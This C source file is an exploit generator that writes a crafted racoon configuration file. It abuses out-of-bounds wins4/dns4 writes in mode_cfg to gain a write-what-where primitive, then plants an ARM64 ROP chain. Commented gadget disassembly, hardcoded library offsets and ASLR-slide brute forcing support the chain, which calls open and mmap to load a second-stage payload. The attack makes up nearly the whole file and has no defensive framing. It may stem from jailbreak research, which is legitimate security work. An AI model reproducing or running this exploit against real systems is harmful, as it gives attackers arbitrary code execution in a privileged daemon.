// port of the old python generator file in the honeybadger repo
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

enum ropgadget_types {
	STATIC,
	CODEADDR,
	OFFSET,
	NONE
};

struct rop_gadget {
	uint64_t value;
	int type;
	struct rop_gadget * next;
};
typedef struct rop_gadget rop_gadget_t;

struct offset_struct {
	int dns4_array_to_lcconf;
	rop_gadget_t * stage1_ropchain;
	uint32_t str_buff_offset;
	uint32_t max_slide;
	uint32_t slide_value;
	uint64_t pivot_x21;
	uint64_t memmove;
	uint64_t lcconf_counter_offset;
	uint64_t BEAST_GADGET;
	uint64_t longjmp;
	uint64_t open;
	uint64_t mmap;
	uint64_t stage2_base;
	uint64_t stage2_size;
};
typedef struct offset_struct offset_struct_t;
#define STAGE2_FD 3
#define RACOON_YY_BUF_SIZE 16384
#define BYTES_PER_WRITE 400 // approx amount of bytes we need for one 64-bit write FIXME: this can be prob way lower than 400

void stage1(int fd, offset_struct_t * offsets);
void get_ip_from_value(char * ip, uint32_t value);
void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what);

uint32_t oldhigher_lcconf = 0xffffffff; // older value is unknown but we don't write to any address which has all high bits set so we can just set them here and the first time we need it in code we can handle it
char dns4_array_to_lcconf_distance[16];
uint32_t total_bytes_written = 0;

void generate(char* filename, offset_struct_t * offsets) {
	int f = open(filename,O_WRONLY | O_CREAT);
	stage1(f,offsets);
}

#define shift_mask(value,shift,mask) ((value >> shift) & mask)
#define shiftm(value,shift) shift_mask(value,shift,0xff)
void get_ip_from_value(char * ip, uint32_t value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
}
void get_ip_from_value_int(char * ip, int value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,0),shiftm(value,8),shiftm(value,16),shiftm(value,24));
}

// overwrites the lcconf pointer in racoon
void change_lcconf(int fd, uint64_t new_addr) {
	// buffer we will write to the file at some point
	char buf[1024] = "mode_cfg{";
	// write what where template, four times wins4 <random ip> to move the wins pointer oob, one time wins 255.255.255.255 to overwrite the wins4 array index variable with -1
	// wins4%s to overwrite the dns4 array index variable with a negative number to point it to lcconf
	// dns4 to overwrite lcconf
	char * www = "wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins4255.255.255.255;wins4%s;dns4%s;";

	uint32_t lower = new_addr & 0xffffffff;
	uint32_t higher = (new_addr >> 32) & 0xffffffff;

	// overwrite the lower half of the lcconf pointer
	char value_ip[16]; // 255.255.255.255 is max so 16 is always enough
	get_ip_from_value((char*)&value_ip,lower);
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, www, dns4_array_to_lcconf_distance, value_ip);

	if (higher != oldhigher_lcconf) {
		oldhigher_lcconf = higher;
		// with each dns4 write the index moves one array item (32 bit) down, which is perfect for us because now we can just use another dns4 statment to overwrite the higher bits of the lcconf pointer
		// this is an improvment from the python script which saves a hell lot of bytes
		get_ip_from_value((char*)&value_ip,higher);
		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "dns4%s;",value_ip);
	}
	strcat(buf,"}"); // close the mode_cfg statment
	total_bytes_written += strlen(buf);
	write(fd,buf,strlen(buf)); // write it to the config file
}

void write_to_lcconf(int fd,uint64_t what) {
	/* old version can be removed once I tested the new one
void write_to_lcconf(uint32_t what) {
	char buf[1024] = "padding{";


	union converter {
		uint32_t old;
		int new;
	}
	converter tmp;
	tmp.old = what;
	snprintf((char*)(((uint64_t)buf)+strlen(buf)+1),sizeof(buf)-strlen(buf)-1, "maximum_length%d;",tmp.new);


	strcat(buf,"}"); // close the padding statment
	write(fd,buf,strlen(buf)); // write it to the config file
	*/
	/*
	 * Note: I thought we might be able to overwrite another field in lcconf which is next to maximum_length, but it turns out that those fields are only semi controllable
	 * If there would be two fields next to each other we could write a whole 64 bits which would improve the file size a lot
	 * FIXME: we might be able to use retry_count and retry_interval with UNITTYPE_SEC
	 * untested implementation below
	 */

	char buf[1024] = "timer{";


	uint32_t lower = what & 0xffffffff;
	uint32_t higher = (what >> 32) & 0xffffffff;
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "counter%u;",lower);

	// if we only want a 32 bit write we should get one and don't zero out the other 32 bits
	// this is an improvment from the script where we used padding and maximum_length to only write 32 bits each iteration
	// IDK if this works like it should... FIXME: there is a chance that we acc want to write 64 bit with the upper once being zero
	if (higher != 0) {
		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);
	}

	strcat(buf,"}"); // close the padding statment
	total_bytes_written += strlen(buf);
	write(fd,buf,strlen(buf)); // write it to the config file
}

// the main problem here is that an address can contain (and will contain) zero chars so we can't use strlen and strcat
void trigger_exec(int fd,uint32_t padding, uint64_t address) {
	char buf[1024] = "mode_cfg{default_domain\"";
	// add padding (should never reach 100)
	for (int i = 0; i < (padding+8) && i < 100; i++) {
		strcat(buf,"A");
	}
	void* address_in_buf = (void*)((uint64_t)&buf+strlen(buf)-8);
	strcat(buf,"\";}");
	int len = strlen(buf);
	memcpy(address_in_buf,&address,8);
	total_bytes_written += len;
	write(fd,buf,len); // write it to the config file
}

void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
	uint32_t current_chunk_size = total_bytes_written % RACOON_YY_BUF_SIZE;
	if ((current_chunk_size + BYTES_PER_WRITE) > RACOON_YY_BUF_SIZE) {
		// add padding
		char tmp[BYTES_PER_WRITE];
		memset(tmp,0x41,BYTES_PER_WRITE-1);
		tmp[0] = '#';
		tmp[BYTES_PER_WRITE-1] = '\n';
		write(fd,tmp,BYTES_PER_WRITE);
		total_bytes_written += BYTES_PER_WRITE;
	}
	change_lcconf(fd,where-offsets->lcconf_counter_offset);
	write_to_lcconf(fd,what);
}

uint64_t get_ropchain_addr(offset_struct_t * offsets) {
	uint64_t test = offsets->max_slide + offsets->memmove + 16;
	test += (test % 0x10); // align at 16 bytes (stack alignment)
	union converter {
		uint64_t addr;
		char buf[8];
	};
	union converter tmp;
	memset(&tmp.buf,0,sizeof(tmp.buf));
	tmp.addr = test;
	for (int i = 0; i < sizeof(tmp.buf);i++) {
		if (tmp.buf[i] == '"') {
			tmp.addr += 0x10; // we have to respect stack alignment
			i = 0;
		}
	}
	return tmp.addr;
}

void stage1(int fd, offset_struct_t * offsets) {
	// setup stage1
	// get the ip which reflex the distance between the dns4_array and lcconf as an int
	get_ip_from_value_int((char*)&dns4_array_to_lcconf_distance,offsets->dns4_array_to_lcconf / 4);
	
	/*www64(fd,offsets,0x4141,0x4141);
	return;*/

	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
	uint64_t ropchain_addr = get_ropchain_addr(offsets);
	printf("Chain will be at: %llx\n",ropchain_addr);

	// write all the values which shouldn't be slid
	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
	uint64_t curr_ropchain_addr = ropchain_addr;

	while (curr_gadget != NULL) {
		switch(curr_gadget->type) {
			case STATIC:
				www64(fd,offsets,curr_ropchain_addr, curr_gadget->value);
				break;
			case OFFSET:
				www64(fd,offsets,curr_ropchain_addr,ropchain_addr+curr_gadget->value);
				break;
			default:
				break;
		}
		curr_ropchain_addr += 8;
		curr_gadget = curr_gadget->next;
	}
	int iterations = (offsets->max_slide/offsets->slide_value);
	printf("%d iterations\n",iterations);
	for (int i = iterations; i >= 0; i--) {
		uint64_t slide = i*offsets->slide_value;
		//www64(fd,offsets,0x4141414141,offsets->memmove+slide);
		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
		uint64_t curr_ropchain_addr = ropchain_addr;
		while (curr_gadget != NULL) {
			switch (curr_gadget->type) {
				case CODEADDR:
					www64(fd,offsets,curr_ropchain_addr,curr_gadget->value+slide);
					break;
				default:
					break;
			}
			curr_gadget = curr_gadget->next;
			curr_ropchain_addr += 8;
		}
		trigger_exec(fd,offsets->str_buff_offset, ropchain_addr);
	}
}

#define ROP_SETUP(offsets) \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	(offsets)->stage1_ropchain = curr_gadget;

#define ADD_GADGET() \
	if (prev != NULL) { \
		prev = curr_gadget; \
		curr_gadget = malloc(sizeof(rop_gadget_t));\
		curr_gadget->next = NULL; \
		curr_gadget->type = NONE; \
		prev->next = curr_gadget; \
	}else{ \
		prev = curr_gadget; \
	}

#define ADD_CODE_GADGET(addr) \
	ADD_GADGET(); \
	curr_gadget->value = addr; \
	curr_gadget->type = CODEADDR;

#define ADD_STATIC_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = STATIC;

#define ADD_OFFSET_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = OFFSET;

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
	myoffsets.lcconf_counter_offset = 0x10c;
	myoffsets.memmove = 0x1aa0b8bb8;
	myoffsets.longjmp = 0x180a817dc;
	myoffsets.mmap = 0x18095942c;
	myoffsets.open = 0x1809779ac;
	myoffsets.max_slide = 0x66dc000;
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = 0x1990198fc;
	myoffsets.str_buff_offset = 8;
	myoffsets.BEAST_GADGET = 0x1a0478c70;
	myoffsets.stage2_base = 0x420000000;
	myoffsets.stage2_size = 0x1000;



	/*
	[1]:

	We start with nothing but rip control and x21 pointing to a string buffer (AAAAAAAA<address of our rop stack>)
	the pivot x21 gadget looks like this:
	(this comes from libLLVM)
	0x1990198fc      a80640f9       ldr x8, [x21, 8]    <= x8 = address of our rop stack
	0x199019900      090140f9       ldr x9, [x8]        <= x9 is the first value at our rop stack
	0x199019904      292940f9       ldr x9, [x9, 0x50]  <= x9 is loaded from x9->0x50 and this is used to jump (we need to put our next code pointer there)
	0x199019908      e30740f9       ldr x3, [sp, 8]     <= x3 comes from the stack so we don't know what it will contain
	0x19901990c      e20300aa       mov x2, x0          <= don't know what's in x0
	0x199019910      e00308aa       mov x0, x8          <= x0 will contain x8 so the address of our rop stack
	0x199019914      e10316aa       mov x1, x22         <= don't know what's in x22
	0x199019918      e40314aa       mov x4, x20         <= don't know what's in x20
	0x19901991c      e50313aa       mov x5, x19         <= don't know what's in x19
	0x199019920      20013fd6       blr x9              <= will branch to [x8]->0x50

	This means that the first value in our stack needs to point to a place where +0x50 the new func pointer will be found

	[2]:
	Next we jump to longjmp to pivot and get more control over our registers
	x0 will point to the top of the stack
	(this comes from libsystem_platform)
	__longjmp:
	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
	   180a817e4	LDP     X23, X24, [X0,#32]   // x23 = our stack 0x20 and x24 = our stack 0x28
	   180a817e8	LDP     X25, X26, [X0,#48]   // x25 = our stack 0x30 and x26 = our stack 0x38
	   180a817ec	LDP     X27, X28, [X0,#64]   // x27 = our stack 0x40 and x28 = our stack 0x48
	   180a817f0	LDP     X29, X30, [X0,#80]   // x29 = our stack 0x50 and x30 = our stack 0x58
	   180a817f4	LDP     X29, X2, [X0,#96]    // x29 = our stack 0x60 and x2  = our stack 0x68
	   180a817f8	LDP     D8, D9, [X0, #112]   // we can ignore those registers
	   180a817fc	LDP     D10, D11, [X0, #128] //
	   180a81800	LDP     D12, D13, [X0, #144] //
	   180a81804	LDP     D14, D15, [X0, #160] //
	   180a81808	ADD     X31, X2, #0    	     // we pivot using x2 which is loaded from
	   180a8180c	MOV     X0, X1         	     // x0 will now contain the contents of x1 we can't control atm
	   180a81810	CMP     X0, #0         	     // irrelvant
	   180a81814	B.NE    0x180a8181c
	   180a81818	ADD     X0, X0, #1
	   180a8181c    RET                          // pivoted

	   So basically we want to set 0x58 to our next gadget and 0x68 to the address of our new stack

	[3]:
	
	Siguza found this beautiful gadget using r2 and some mask tricks:
		0x1a0478c70      e40316aa       mov x4, x22
		0x1a0478c74      e50314aa       mov x5, x20
		0x1a0478c78      e60315aa       mov x6, x21
		0x1a0478c7c      e70313aa       mov x7, x19
		0x1a0478c80      e0031aaa       mov x0, x26
		0x1a0478c84      e10319aa       mov x1, x25
		0x1a0478c88      e20318aa       mov x2, x24
		0x1a0478c8c      e30317aa       mov x3, x23
		0x1a0478c90      60033fd6       blr x27                    ;[0]
		0x1a0478c94      fd7b47a9       ldp x29, x30, [sp, 0x70]
		0x1a0478c98      f44f46a9       ldp x20, x19, [sp, 0x60]
		0x1a0478c9c      f65745a9       ldp x22, x21, [sp, 0x50]
		0x1a0478ca0      f85f44a9       ldp x24, x23, [sp, 0x40]
		0x1a0478ca4      fa6743a9       ldp x26, x25, [sp, 0x30]
		0x1a0478ca8      fc6f42a9       ldp x28, x27, [sp, 0x20]
		0x1a0478cac      e923416d       ldp d9, d8, [sp, 0x10]
		0x1a0478cb0      ff030291       add sp, sp, 0x80
		0x1a0478cb4      c0035fd6       ret

		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
		Path is stored at 0xc4, we can do this because we assume that the stage2 baseaddress will always have a zero byte

		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY

		path: (/private/etc/racoon/<func pointer>\x00):
		0x2f707269 /pri
		0x76617465 vate
		0x2f657463 /etc
		0x2f706163 /rac
		0x6f6f6e2f oon/
		0xXXXXXXXX <func pointer>
		0x00
		
		Fingers crossed that the string will survive when we start to call funcs...

	[4]:
		Now we have fully loaded gadgets again and we will just jump back to the gadget used in [3] but ofc with other args
		to call mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_FIXED,STAGE2_FD,0)
		
		This means that x26 has to be the stage2_base, x25 has to be the stage2_size, x24 has to bb PROT_READ | PROT_WRITE, x23 STAGE2_FD and x22 0
		
	[5]:
		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
	*/
	ROP_SETUP(&myoffsets);
	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
	ADD_GADGET();							   // 0x08		[2] x20 [3] x5/sixth arg
	ADD_GADGET();							   // 0x10		[2] x21 [3] x6/seventh arg
	ADD_GADGET();							   // 0x18		[2] x22 [3] x4/fifth arg 
	ADD_GADGET();							   // 0x20		[2] x23 [3] x3/fourth arg
	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
	ADD_OFFSET_GADGET(0xc4);				   // 0x38		[2] x26 [3] x0/first arg
	ADD_CODE_GADGET(myoffsets.open);		   // 0x40		[2] x27 [3] call gadget
	ADD_GADGET();							   // 0x48		[2] x28 
	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x58		[2] x30 (next gadget)
	ADD_GADGET();							   // 0x60		[2] x29
	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
	ADD_GADGET();							   // 0x70		[2] weird Dx registers
	ADD_GADGET();							   // 0x78		[2] weird Dx registers
	ADD_GADGET();							   // 0x80		[2] weird Dx registers
	ADD_GADGET();							   // 0x88		[2] weird Dx registers
	ADD_GADGET();							   // 0x90		[2] weird Dx registers
	ADD_GADGET();							   // 0x98		[2] weird Dx registers
	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
	ADD_GADGET();							   // 0xa8		[2] weird Dx registers

	ADD_GADGET();							   // 0xb0		[2] new stack top 
	ADD_GADGET();							   // 0xb8
	ADD_STATIC_GADGET(0x6972702f00000000);	   // 0xc0		[3] d9		      (/pri)
	ADD_STATIC_GADGET(0x6374652f65746176);	   // 0xc8		[3] d8            (vate/etc)
	ADD_STATIC_GADGET(0x2f6e6f6f6361722f);	   // 0xd0		[3] x28           (/racoon/)
	ADD_CODE_GADGET(myoffsets.mmap);		   // 0xd8		[3] x27 [4] call gadget
	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0xe0		[3] x26 [4] x0/first arg
	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0xe8		[3] x25 [4] x1/second arg
	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0xf0		[3] x24 [4] x2/third arg
	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) // 0xf8		[3] x23 [4] x3/fourth arg
	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x100		[3] x22 [4] x4/fifth arg
	ADD_STATIC_GADGET(0);					   // 0x108		[3] x21 [4] x5/sixth arg
	ADD_GADGET();							   // 0x110		[3] x20 [4] x6/seventh arg
	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
	ADD_GADGET();							   // 0x120		[3] x29
	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x128		[3] x30 (next gadget)

	ADD_GADGET();							   // 0x130		[3] new stack top
	ADD_GADGET();							   // 0x138		
	ADD_GADGET();							   // 0x140		[4] d9
	ADD_GADGET();							   // 0x148		[4] d8
	ADD_GADGET();							   // 0x150		[4] x28
	ADD_GADGET();							   // 0x158		[4] x27
	ADD_GADGET();							   // 0x160		[4] x26
	ADD_GADGET();							   // 0x168		[4] x25
	ADD_GADGET();							   // 0x170		[4] x24
	ADD_GADGET();							   // 0x178		[4] x23
	ADD_GADGET();							   // 0x180		[4] x22
	ADD_GADGET();							   // 0x188		[4] x21
	ADD_GADGET();							   // 0x190		[4] x20
	ADD_GADGET();							   // 0x198		[4] x19
	ADD_GADGET();							   // 0x1a0		[4] x29
	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x1a8		[4] x30 (next gadget)

	ADD_GADGET();							   // 0x1b0		[4] new stack top







	generate("./test.conf",&myoffsets);

	return 0;
}
